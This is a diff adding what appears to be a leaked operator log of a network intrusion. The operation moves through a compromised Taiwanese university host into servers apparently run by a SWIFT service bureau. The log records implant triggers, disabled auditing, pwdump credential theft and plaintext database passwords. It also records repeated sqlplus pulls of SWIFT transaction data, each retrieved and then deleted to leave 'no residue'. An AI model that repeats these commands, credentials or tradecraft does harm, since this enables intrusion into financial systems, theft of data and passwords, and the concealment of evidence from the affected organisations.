@@ -1,0 +1,347 @@
+ISP:	LK
+City:	
+Phone:	
+ISP IP:	69.42.98.86
+Source IP:	
+FINAL target IP:	
+Ops Machine:	LOCALHOST.LOCALDOMAIN
+Redirecting Method 1:	INCISION
+Redirect Host 1:	163.22.20.4
+Redirect Target 1:	192.168.208.11
+Redirecting Method 2:	INCISION
+Redirect Host 2:	192.168.208.11
+Redirect Target 2:	192.168.200.51
+Redirecting Method 3:	INCISION
+Redirect Host 3:	192.168.208.11
+Redirect Target 3:	192.168.200.87
+
+
+BEGIN UNIX OPNOTES:
+
+Targets (IP, full domain name, target tags: pitchimpair unsuccessful not_attempted ) : 
+--> 163.22.20.4            euclid.csie.cnu.edu.tw         pitchimpair          unix      successful    
+---> 192.168.208.11        ensbdmgmt2.eastnets.com        jeepflea_market      windows   successful    
+----> 192.168.200.51       ensbdsl1.eastnets.com          jeepflea_market      windows   successful    
+----> 192.168.200.87       ensbdnisl2.eastnets.com        jeepflea_market      windows   successful    
+Ops Machine: WO
+Results:
+
+PROJECT=JEEPFLEA_MARKET
+OPUSER=90069
+OPSCHEDULE=13053013155600
+SCRUBVER=6.007000002
+
+======================= P0
+--- 163.22.20.4 ---
+=======================
+ourtn -Y5eU /current/up/noserver-x86sol2.8 -wBIN 163.22.20.4
+2013-06-05 17:55:19 UTC on target.
+
+-w
+Uptime:  16 day(s), 17:07:14
+
+USER      TTY       LOGIN@             IDLE       PID
+
+-logs -x
+-gs pscolor -tp
+-lss . /tmp / /root
+-tail /etc/rc.local
+-tail /etc/ld.so.preload
+
+2013-06-05 17:58:13 UTC clear; moving.
+
+-tunnel
+r 50986 192.168.254.72
+r 41027 192.168.254.72
+
+-logs -x
+-gs pscolor -tp
+-lss . /tmp / /root
+-tail /etc/rc.local
+-tail /etc/ld.so.preload
+2013-06-05 20:26:36 UTC -bB
+
+
+
+
+
+
+LOCALHOST.LOCALDOMAIN: scrubhands v. 6.007000002 20130605-1729
+###################
+SCRUBHANDS v6.007000002 (suite v6.7.0.02 run in /192.168.254.71) command line:
+:
+/usr/local/bin/scrubhands -t -S 13053013155600 -P JEEPFLEA_MARKET -I 90069 -T 11-5 -n 8.8.8.8,4.2.2.2 69.42.98.86/240/94
+###################
+Final lines of bwmonitor.txt:
+Wed Jun 05 20:47:11 UTC 2013
+eth0        bytes      (MB)    packets     kbps    (kBps)   kbps-1m  kbps-10m   kbps-hr
+  TX     10785343    (10.3)      50975      0.0     (0.0)       0.0       0.1       4.4
+  RX     52281957    (49.9)      58906      0.0     (0.0)       0.0       0.5      55.9
+
+###################################################
+PROJECT: jeepflea_market
+DATE: 05:39 PM 06/05/2013
+OPUSER: 90069
+OPSCHEDULE: 13053013155600
+#Op Status: Unsuccessful
+#Non-Standard: True
+###################################################
+Targets:
+
+
+
+Results:
+======================= T1
+--- 192.168.208.11  --- ensbdmgmt2
+=======================
+UR:JEEPFLEA_MARKET59
+egg prep:
+PITCHIP:50986
+PITCHIP:41027
+PSP: N/A
+   <CallbackAddress>163.22.20.4</CallbackAddress>
+-   <CallbackPorts>
+-     <CallbackPair>
+-       <SrcPort>0</SrcPort>
+-       <DstPort>50986</DstPort>
+-     </CallbackPair>
+-     <CallbackPair>
+-       <SrcPort>0</SrcPort>
+-       <DstPort>41027</DstPort>
+-     </CallbackPair>
+-   </CallbackPorts>
+6:07 PM 6/5/2013 on target.
+
+6:11 PM 6/5/2013 simple barfed on me. Here's the output I got:
+Below match threshold or multiple matches. You must choose. Choose wisely.
+
+  0) None of these - create a new target db
+
+  1) (Confidence: 0.166666666667) JEEPFLEA_MARKET / ENSBDFIIV1 / PC ID 0x000000010001266d / eb62f5d8-4365-41bc-a38b-559bf60ee72d / MACS: ['00-22-64-9d-4d-fc', '00-22-64-9d-4d-fe', '00-24-81-a7-4b-06']
+
+Enter selection:
+0
+* <type 'exceptions.Exception'> : Have a target ID, but data not in database, something is wrong
+--Traceback (most recent call last):
+  File "D:\DSZOpsDisk\Resources\Ops\PyScripts\Connected.py", line 24, in <module>
+    targ = ops.project.getTarget()
+  File "D:\DSZOpsDisk\Resources\Ops\PyScripts\Lib\ops\project\__init__.py", line 125, in getTarget
+    raise Exception('Have a target ID, but data not in database, something is wrong')
+--
+TL;DR: couldn't find the targetdb for the target. Then simple bailed entirely... ran "survey -run" to force simple to run.
+Uptime: 110 days, 19:58:38
+audit dorked; pwdump grabbed.
+
+
+monitor packetredirect -listenport 2160 -raw
+redirect -tcp -lplisten 1922 -target 192.168.200.51 1922
+redirect -tcp -lplisten 9002 -target 192.168.200.87 9002
+
+diffhour -age 3h -sysdrive -recursive
+channels stomped..
+8:25 PM 6/5/2013 QND
+
+======================= T2
+--- 192.168.200.51  --- ensbdsl1
+=======================
+PSP: Symantec Endpoint 11
+Trigger: 0x1000125aa ICMP 8,0 Listen RHP (1922)
+
+           ----====**** CORDIALFLIMSY TRIGGER BEGIN ****====----
+		Target Address    : 192.168.200.51
+		Source Address    : 192.168.200.11
+		Target Protocol   : ICMP
+		ICMP type,code    : 8,0
+		Keyfile           : D:\DSZOpsDisk\Resources\Pc\Keys\JEEPFLEA_MARKET\private_key.bin
+		Listen Address    : 0.0.0.0
+		Listen Port       : 1922
+		Redirect through  : 127.0.0.1:2160
+		Final Destination : 192.168.200.51
+		Id                : 0x00000001000125aa
+		Packet Trailer    : 0x2f78
+
+           ----====**** CORDIALFLIMSY TRIGGER END ****====----
+           
+6:24 PM 6/5/2013 on target.
+Uptime: 6 days, 23:51:50
+dorked audit, pwdumped.
+
+SWIFT collect:
+
+put D:\DSZOpsDisk\tmp\MSIef7bc.LOG -name C:\windows\temp\MSIef7bc.LOG
+cd C:\windows\temp
+run -command "cmd.exe /q" -redirect
+
+D:\alliance\access\database\bin\sqlplus.exe saauser/Aetq9f7CQtljCHtAmstCGF64C 
+@MSIef7bc.LOG
+
+Enter Output File Name: MSIef7bd.LOG
+Enter BEGINNING date in the format "yyyymmdd": 20130201
+Enter ENDING date in the format "yyyymmdd": 20130301
+
+ended out ~19m.
+get C:\WINDOWS\temp\MSIef7bd.LOG
+deleted MSIef7bd.LOG
+
+Enter Output File Name: MSIef7be.LOG
+Enter BEGINNING date in the format "yyyymmdd": 20130302
+Enter ENDING date in the format "yyyymmdd": 20130401
+ended out ~20m
+
+get C:\WINDOWS\temp\MSIef7be.LOG
+deleted file.
+
+Enter Output File Name: MSIef7bf
+Enter BEGINNING date in the format "yyyymmdd": 20130402
+Enter ENDING date in the format "yyyymmdd": 20130420
+
+note: the script will automatically assign an LST extension if you fail to supply an extension...
+
+~3m in size.
+get C:\WINDOWS\temp\MSIef7bf.LST
+deleted .LST file
+
+Enter Output File Name: MSIef7b0.LOG
+Enter BEGINNING date in the format "yyyymmdd": 20130421
+Enter ENDING date in the format "yyyymmdd": 20130510
+
+file ended up being 57 bytes.
+deleted.
+
+re-queried:
+Enter Output File Name: MSIef7b0.LOG
+Enter BEGINNING date in the format "yyyymmdd": 20130421
+Enter ENDING date in the format "yyyymmdd": 20130604
+
+file was 57 bytes again.
+grabbed and deleted.
+
+deleting MSIef7bc.LOG
+
+going to do a survey of the database to see what's wrong here...
+put D:\DSZOpsDisk\tmp\MSI6fe11.LOG -name C:\windows\temp\MSI6fe11.LOG
+
+D:\alliance\access\database\bin\sqlplus.exe / as SYSDBA
+@MSI6fe11.LOG
+MSI6ff11.LOG output filename.
+
+file is appox. 5k
+grabbed and deleting
+
+deleted MSI6fe11.LOG
+
+7:35 PM 6/5/2013 all done here; no residue. time to go.
+
+grabbed:
+D:\alliance\access\database\network\admin\
+tnsnames.ora
+sqlnet.ora
+listener.ora
+
+diffhour -age 2h -sysdrive -recursive
+channels
+7:45 PM 6/5/2013 QND
+
+
+
+
+======================= T3
+--- 192.168.200.87  --- ensbdnisl2
+=======================
+PSP: Symantec Endpoint 11
+Trigger: 0x1000125b9 ICMP 8,0 Listen RHP (9002)
+
+           ----====**** CORDIALFLIMSY TRIGGER BEGIN ****====----
+		Target Address    : 192.168.200.87
+		Source Address    : 192.168.200.11
+		Target Protocol   : ICMP
+		ICMP type,code    : 8,0
+		Keyfile           : D:\DSZOpsDisk\Resources\Pc\Keys\JEEPFLEA_MARKET\private_key.bin
+		Listen Address    : 0.0.0.0
+		Listen Port       : 9002
+		Redirect through  : 127.0.0.1:2160
+		Final Destination : 192.168.200.87
+		Id                : 0x00000001000125b9
+		Packet Trailer    : 0x3036
+
+           ----====**** CORDIALFLIMSY TRIGGER END ****====----
+6:25 PM 6/5/2013 on target.
+Below match threshold or multiple matches. You must choose. Choose wisely.
+
+  0) None of these - create a new target db
+
+  1) (Confidence: 0.166666666667) JEEPFLEA_MARKET / ENSBDSL3 / PC ID 0x00000001000125b8 / ee72ac50-2d6f-4198-b196-724303e12f23 / MACS: ['00-23-7d-f2-d6-08']
+
+Enter selection:
+0
+* <type 'exceptions.Exception'> : Have a target ID, but data not in database, something is wrong
+--Traceback (most recent call last):
+  File "D:\DSZOpsDisk\Resources\Ops\PyScripts\Connected.py", line 24, in <module>
+    targ = ops.project.getTarget()
+  File "D:\DSZOpsDisk\Resources\Ops\PyScripts\Lib\ops\project\__init__.py", line 125, in getTarget
+    raise Exception('Have a target ID, but data not in database, something is wrong')
+--
+TL;Dr: simple exploded again. Can't find the targetdb. same issue as T1. going to run "survey -run"
+
+Uptime: 26 days, 22:22:20
+dorked auditing; grabbed pwdump.
+
+put D:\DSZOpsDisk\tmp\MSIef7bc.LOG -name C:\$recycle.bin\S-1-5-21-2744848747-1958344455-2925660524-500\$ITFPV00.txt
+cd C:\$recycle.bin\S-1-5-21-2744848747-1958344455-2925660524-500\
+run -command "cmd.exe /q" -redirect
+
+
+
+
+D:\alliance\access\database\bin\sqlplus.exe saauser/AF1TR6SnML9U1riiGuMxQRQH5 
+@$ITFPV00.txt
+
+Enter Output File Name: $ITFPV01.txt
+Enter BEGINNING date in the format "yyyymmdd": 20120101
+Enter ENDING date in the format "yyyymmdd": 20120201
+~4m in size.
+grabbing...
+deleting.
+
+Enter Output File Name: $ITFPV02.txt
+Enter BEGINNING date in the format "yyyymmdd": 20120202
+Enter ENDING date in the format "yyyymmdd": 20120501
+~11m in size.
+grabbing...
+deleting.
+
+Enter Output File Name: $ITFPV03.txt
+Enter BEGINNING date in the format "yyyymmdd": 20120502
+Enter ENDING date in the format "yyyymmdd": 20120801
+~10m in size
+grabbing...
+deleting.
+
+Enter Output File Name: $ITFPV04.txt
+Enter BEGINNING date in the format "yyyymmdd": 20120802
+Enter ENDING date in the format "yyyymmdd": 20130101
+accidentally deleted our collection. re-querying, same parameters.
+~20m
+grabbing...
+deleting.
+
+Enter Output File Name: $ITFPV05.txt
+Enter BEGINNING date in the format "yyyymmdd": 20130102
+Enter ENDING date in the format "yyyymmdd": 20130401
+~15m
+grabbing...
+deleting.
+
+Enter Output File Name: $ITFPV06.txt
+Enter BEGINNING date in the format "yyyymmdd": 20130402
+Enter ENDING date in the format "yyyymmdd": 20130604
+~12m
+grabbing...
+deleting.
+
+deleted ITFPV00
+8:20 PM 6/5/2013 all done here.
+
+diffhour -age 2h -sysdrive -recursive
+channels
+8:23 PM 6/5/2013 QND
